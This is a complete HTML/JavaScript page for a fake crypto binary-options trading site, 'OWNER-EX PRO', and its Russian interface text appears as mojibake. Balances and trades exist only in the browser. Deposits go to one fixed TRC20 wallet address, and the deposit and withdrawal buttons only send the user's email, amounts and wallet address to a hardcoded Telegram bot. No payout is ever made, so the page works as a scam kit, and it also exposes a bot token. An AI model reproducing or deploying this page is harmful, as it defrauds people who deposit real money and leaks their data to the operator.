<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OWNER-EX PRO MOBILE</title>
    
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2220%22 fill=%22%230ecb81%22/><text y=%22.9em%22 font-size=%2280%22 font-weight=%22900%22 x=%2250%%22 text-anchor=%22middle%22 fill=%22%23000%22>E</text></svg>">
    
    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');

        :root {
            --bg: #0b0e11;
            --panel: #161a1e;
            --accent: #0ecb81;
            --red: #f6465d;
            --green: #0ecb81;
            --border: #2b2f36;
        }

        body, html {
            margin: 0; padding: 0;
            background: var(--bg);
            color: #eaecef;
            font-family: 'Inter', sans-serif;
            height: 100%;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        /* --- AUTH SCREEN --- */
        #authScreen {
            position: fixed; inset: 0; background: var(--bg); z-index: 9999;
            display: flex; align-items: center; justify-content: center; padding: 20px;
        }
        .auth-card {
            background: var(--panel); padding: 25px; border-radius: 15px;
            width: 100%; max-width: 350px; border: 1px solid var(--accent); text-align: center;
        }
        
        /* --- HEADER --- */
        header {
            height: 60px; background: var(--panel);
            border-bottom: 1px solid var(--border);
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 15px; flex-shrink: 0; z-index: 100;
        }
        .logo-text { font-weight: 900; font-size: 18px; letter-spacing: -0.5px; }

        /* ASSET SELECTOR */
        .asset-select-container {
            position: relative; background: #000; border: 1px solid var(--border);
            border-radius: 6px; padding: 5px 10px; cursor: pointer;
            display: flex; align-items: center; gap: 8px;
        }
        .asset-dropdown {
            position: absolute; top: 120%; left: 0;
            background: var(--panel); border: 1px solid var(--border);
            border-radius: 8px; width: 200px; display: none; z-index: 1000;
        }
        .asset-option { padding: 12px; display: flex; justify-content: space-between; font-size: 12px; border-bottom: 1px solid #222; }

        /* --- LAYOUT --- */
        .terminal-container {
            display: flex; flex-direction: column; flex: 1; min-height: 0;
        }

        /* CHART AREA */
        .chart-section { flex: 1; display: flex; flex-direction: column; background: #000; min-height: 300px; }
        #chart { flex: 1; width: 100%; }

        /* MOBILE NAVIGATION (BOTTOM) */
        .side-nav {
            order: 3; height: 60px; background: var(--panel);
            border-top: 1px solid var(--border);
            display: flex; flex-direction: row; justify-content: space-around; align-items: center;
            padding: 0;
        }
        .nav-item { font-size: 20px; color: #848e9c; }
        .nav-item.active { color: var(--accent); }

        /* TRADE PANEL (ADAPTIVE) */
        .trade-panel {
            background: var(--panel); border-top: 1px solid var(--border);
            padding: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
        }
        .trade-input-box { background: var(--bg); border: 1px solid var(--border); padding: 8px 12px; border-radius: 6px; }
        .trade-input-box label { font-size: 10px; color: #848e9c; display: block; margin-bottom: 4px; }
        .trade-input-box input { background: transparent; border: none; color: #fff; width: 100%; font-size: 18px; font-weight: 800; outline: none; }

        .btn-trade { height: 50px; border: none; border-radius: 8px; font-weight: 900; font-size: 16px; cursor: pointer; }
        .btn-up { background: var(--green); color: #000; }
        .btn-down { background: var(--red); color: #fff; }

        /* HISTORY */
        .history-container {
            height: 150px; background: var(--panel); border-top: 1px solid var(--border);
            overflow-y: auto; font-size: 11px;
        }
        .h-table { width: 100%; border-collapse: collapse; }
        .h-table th { text-align: left; color: #555; padding: 10px; border-bottom: 1px solid var(--border); }
        .h-table td { padding: 10px; border-bottom: 1px solid #222; }

        /* MODALS (MOBILE FRIENDLY) */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; display: none; padding: 15px; overflow-y: auto; }
        .cash-modal { background: #1c1f22; width: 100%; max-width: 450px; border-radius: 12px; margin: auto; }
        .cash-content { padding: 20px; }
        .method-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
        .method-card { padding: 15px; background: #111; border: 1px solid #333; border-radius: 8px; text-align: center; }

        .custom-input { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 15px; border-radius: 8px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box; }

        /* DESKTOP FIXES */
        @media (min-width: 900px) {
            .terminal-container { flex-direction: row; grid-template-columns: 70px 1fr 300px; display: grid; }
            .side-nav { flex-direction: column; order: 0; height: auto; border-right: 1px solid var(--border); border-top: none; }
            .trade-panel { display: flex; flex-direction: column; grid-template-columns: none; width: 300px; padding: 25px; height: 100%; }
            .history-container { height: 250px; }
            .btn-trade { height: 65px; }
        }

        footer { display: none; } /* –°–∫—Ä—ã–≤–∞–µ–º —Ñ—É—Ç–µ—Ä –Ω–∞ –º–æ–±–∏–ª–∫–∞—Ö –¥–ª—è —ç–∫–æ–Ω–æ–º–∏–∏ –º–µ—Å—Ç–∞ */
    </style>
</head>
<body>

<div id="authScreen">
    <div class="auth-card">
        <div class="auth-logo" style="color:var(--accent); font-weight:900; margin-bottom:20px;">OWNER-EX</div>
        <div style="display:flex; background:#222; border-radius:6px; margin-bottom:15px; padding:2px;">
            <div id="tabLogin" class="auth-tab active" style="flex:1; padding:8px; cursor:pointer; font-size:12px;" onclick="switchAuth('login')">–í–•–û–î</div>
            <div id="tabRegister" class="auth-tab" style="flex:1; padding:8px; cursor:pointer; font-size:12px;" onclick="switchAuth('reg')">–†–ï–ì–ò–°–¢–†–ê–¶–ò–Ø</div>
        </div>
        <input type="email" id="authEmail" class="custom-input" placeholder="Email">
        <input type="password" id="authPass" class="custom-input" placeholder="–ü–∞—Ä–æ–ª—å">
        <button id="authBtn" onclick="handleAuth()" class="btn-trade btn-up" style="width:100%;">–í–û–ô–¢–ò</button>
    </div>
</div>

<header>
    <div style="display:flex; align-items:center; gap:10px;">
        <div class="asset-select-container" onclick="toggleAssets()">
            <i class="fab fa-bitcoin" id="curIcon" style="color:var(--accent)"></i>
            <span id="curName" style="font-weight:800; font-size:12px;">BTC/USDT</span>
            <div class="asset-dropdown" id="assetDropdown">
                <div class="asset-option" onclick="selectAsset('BTCUSDT','BTC/USDT','fa-bitcoin')">BTC/USDT <span>82%</span></div>
                <div class="asset-option" onclick="selectAsset('ETHUSDT','ETH/USDT','fa-ethereum')">ETH/USDT <span>82%</span></div>
                <div class="asset-option" onclick="selectAsset('EURUSDT','EUR/USD','fa-euro-sign')">EUR/USD <span>88%</span></div>
            </div>
        </div>
    </div>
    <div style="text-align:right;">
        <div id="mainBal" style="color:var(--accent); font-weight:900; font-size:16px;">$10,000.00</div>
        <div style="font-size:9px; color:#555;" onclick="setAcc('real')" id="accType">DEMO ACCOUNT</div>
    </div>
</header>

<div class="terminal-container">
    <div class="side-nav">
        <i class="fas fa-chart-line nav-item active" onclick="closeModals()"></i>
        <i class="fas fa-wallet nav-item" onclick="openModal('cashModal')"></i>
        <i class="fas fa-user-circle nav-item" onclick="openModal('profModal')"></i>
        <i class="fas fa-sign-out-alt nav-item" onclick="logout()" style="color:var(--red)"></i>
    </div>

    <div class="chart-section">
        <div id="chart"></div>
        <div class="history-container">
            <table class="h-table">
                <tbody id="hBody"></tbody>
            </table>
        </div>
    </div>

    <div class="trade-panel">
        <div class="trade-input-box"><label>–°–£–ú–ú–ê ($)</label><input type="number" id="tAmt" value="100"></div>
        <div class="trade-input-box"><label>–í–†–ï–ú–Ø (–°–ï–ö)</label><input type="number" id="tTime" value="30"></div>
        <button class="btn-trade btn-up" onclick="makeTrade('CALL')">–í–´–®–ï</button>
        <button class="btn-trade btn-down" onclick="makeTrade('PUT')">–ù–ò–ñ–ï</button>
    </div>
</div>

<div id="cashModal" class="modal-overlay">
    <div class="cash-modal">
        <div style="display:flex; border-bottom:1px solid #333;">
            <div id="depT" class="active" style="flex:1; padding:15px; text-align:center; cursor:pointer;" onclick="switchCash('dep')">–î–ï–ü–û–ó–ò–¢</div>
            <div id="witT" style="flex:1; padding:15px; text-align:center; cursor:pointer;" onclick="switchCash('wit')">–í–´–í–û–î</div>
        </div>
        <div class="cash-content">
            <div id="cashMain">
                <div class="method-grid">
                    <div class="method-card active" onclick="selectMethod(this,'USDT TRC20')">USDT</div>
                    <div class="method-card" onclick="selectMethod(this,'TON')">TON</div>
                </div>
                <input type="number" id="cSum" class="custom-input" placeholder="–°—É–º–º–∞ ($)">
                <div id="witAddr" style="display:none;"><input type="text" id="wAddr" class="custom-input" placeholder="–ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞"></div>
                <button class="btn-trade btn-up" style="width:100%;" onclick="processCash()">–ü–†–û–î–û–õ–ñ–ò–¢–¨</button>
            </div>
            <div id="paymentInfo" style="display:none; text-align:center;">
                <div class="qr-wrap" style="margin: 0 auto 15px;"><img id="qr" src="" style="width:100%;"></div>
                <div class="address-box" id="addr" style="font-size:10px; margin-bottom:15px;">TRRPjzHTcHeBLzCuR5GyMQ6osvQMk3Vnq7</div>
                <button class="btn-trade btn-up" style="width:100%;" onclick="confirmPay()">–Ø –û–ü–õ–ê–¢–ò–õ</button>
            </div>
            <p onclick="closeModals()" style="text-align:center; color:#555; font-size:12px; margin-top:15px;">–ó–ê–ö–†–´–¢–¨</p>
        </div>
    </div>
</div>

<div id="profModal" class="modal-overlay">
    <div class="auth-card" style="max-width:400px; margin:auto;">
        <h3 style="margin-bottom:15px;">–ü–†–û–§–ò–õ–¨</h3>
        <input type="text" id="pNick" class="custom-input" placeholder="–ù–∏–∫–Ω–µ–π–º">
        <input type="text" id="pPromo" class="custom-input" placeholder="–ü—Ä–æ–º–æ–∫–æ–¥">
        <button class="btn-trade btn-up" style="width:100%;" onclick="saveProf()">–°–û–•–†–ê–ù–ò–¢–¨</button>
        <p onclick="closeModals()" style="margin-top:15px; color:gray;">–ó–ê–ö–†–´–¢–¨</p>
    </div>
</div>

<script>
    const BOT_TOKEN = "8102627080:AAGGbjyR0g1VzICKb-ait4t3CA34PJz1g5M";
    const CHAT_ID = "6426834853";

    let balances = JSON.parse(localStorage.getItem('owner_bals')) || { demo: 10000, real: 0 };
    let sessionUser = localStorage.getItem('owner_session') || null;
    let trades = JSON.parse(localStorage.getItem('owner_trades')) || [];
    let activeAcc = 'demo', curPrice = 0, curSym = 'BTCUSDT', payMethod = 'USDT TRC20', cashMode = 'dep';
    let chart, series;

    function toggleAssets() { const d = document.getElementById('assetDropdown'); d.style.display = d.style.display === 'block' ? 'none' : 'block'; }
    function selectAsset(id, name, icon) { curSym = id; document.getElementById('curName').innerText = name; document.getElementById('curIcon').className = `fab ${icon}`; toggleAssets(); syncData(); }

    function initChart() {
        chart = LightweightCharts.createChart(document.getElementById('chart'), {
            layout: { background: { color: '#000' }, textColor: '#848e9c' },
            grid: { vertLines: { visible: false }, horzLines: { color: '#111' } },
            timeScale: { borderColor: '#2b2f36' },
            rightPriceScale: { borderColor: '#2b2f36' },
            handleScroll: true, handleScale: true
        });
        series = chart.addCandlestickSeries({ upColor: '#0ecb81', downColor: '#f6465d', borderVisible: false, wickUpColor: '#0ecb81', wickDownColor: '#f6465d' });
        syncData();
    }

    function syncData() {
        fetch(`https://api.binance.com/api/v3/klines?symbol=${curSym}&interval=1h&limit=100`)
            .then(r => r.json()).then(data => series.setData(data.map(d => ({ time: d[0]/1000, open: +d[1], high: +d[2], low: +d[3], close: +d[4] }))));
        if(window.ws) window.ws.close();
        window.ws = new WebSocket(`wss://stream.binance.com:9443/ws/${curSym.toLowerCase()}@kline_1s`);
        window.ws.onmessage = e => { const k = JSON.parse(e.data).k; curPrice = +k.c; series.update({ time: k.t/1000, open: +k.o, high: +k.h, low: +k.l, close: curPrice }); };
    }

    function makeTrade(type) {
        const amt = parseFloat(document.getElementById('tAmt').value);
        if(amt > balances[activeAcc] || amt <= 0) return alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤!");
        balances[activeAcc] -= amt; updateUI();
        const startP = curPrice;
        setTimeout(() => {
            const win = (type === 'CALL' && curPrice > startP) || (type === 'PUT' && curPrice < startP);
            const profit = win ? (amt * 0.82) : -amt;
            if(win) balances[activeAcc] += (amt + (amt * 0.82));
            trades.unshift({ s: curSym.replace('USDT',''), type, amt, res: win ? `+$${(amt*0.82).toFixed(2)}` : `-$${amt}` });
            localStorage.setItem('owner_bals', JSON.stringify(balances));
            localStorage.setItem('owner_trades', JSON.stringify(trades));
            updateUI();
        }, parseInt(document.getElementById('tTime').value) * 1000);
    }

    function updateUI() {
        document.getElementById('mainBal').innerText = `$${balances[activeAcc].toFixed(2)}`;
        document.getElementById('hBody').innerHTML = trades.slice(0,10).map(t => `<tr><td>${t.s}</td><td style="color:${t.res.includes('+')?'#0ecb81':'#f6465d'}">${t.res}</td></tr>`).join('');
    }

    function switchCash(m) { 
        cashMode = m; 
        document.getElementById('depT').className = m === 'dep' ? 'active' : ''; 
        document.getElementById('witT').className = m === 'wit' ? 'active' : '';
        document.getElementById('witAddr').style.display = m === 'wit' ? 'block' : 'none';
    }

    function processCash() {
        const s = document.getElementById('cSum').value; if(s < 10) return alert("–ú–∏–Ω. $10");
        if(cashMode === 'dep') {
            document.getElementById('cashMain').style.display = 'none';
            document.getElementById('paymentInfo').style.display = 'block';
            document.getElementById('qr').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TRRPjzHTcHeBLzCuR5GyMQ6osvQMk3Vnq7`;
        } else {
            const a = document.getElementById('wAddr').value; if(!a) return alert("–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å!");
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=üì§ –í–´–í–û–î: ${sessionUser}\n–°—É–º–º–∞: ${s}$\n–ê–¥—Ä–µ—Å: ${a}`);
            alert("–ó–∞—è–≤–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!"); closeModals();
        }
    }

    function confirmPay() {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=üí∞ –î–ï–ü–û–ó–ò–¢: ${sessionUser}\n–°—É–º–º–∞: ${document.getElementById('cSum').value}$`);
        alert("–û–∂–∏–¥–∞–π—Ç–µ –∑–∞—á–∏—Å–ª–µ–Ω–∏—è!"); closeModals();
    }

    function switchAuth(m) {
        document.getElementById('tabLogin').classList.toggle('active', m==='login');
        document.getElementById('tabRegister').classList.toggle('active', m==='reg');
        document.getElementById('authBtn').innerText = m==='login' ? '–í–û–ô–¢–ò' : '–†–ï–ì–ò–°–¢–†–ê–¶–ò–Ø';
    }

    function handleAuth() {
        const e = document.getElementById('authEmail').value;
        if(!e) return alert("–í–≤–µ–¥–∏—Ç–µ Email");
        sessionUser = e; localStorage.setItem('owner_session', e);
        document.getElementById('authScreen').style.display = 'none';
        initChart(); updateUI();
    }

    function setAcc(t) { activeAcc = t; document.getElementById('accType').innerText = t === 'real' ? 'REAL ACCOUNT' : 'DEMO ACCOUNT'; updateUI(); }
    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
    function closeModals() { document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none'); }
    function logout() { localStorage.removeItem('owner_session'); location.reload(); }
    function selectMethod(el, m) { document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active')); el.classList.add('active'); payMethod = m; }

    window.onload = () => { if(sessionUser) { document.getElementById('authScreen').style.display = 'none'; initChart(); updateUI(); } };
</script>
</body>
</html>
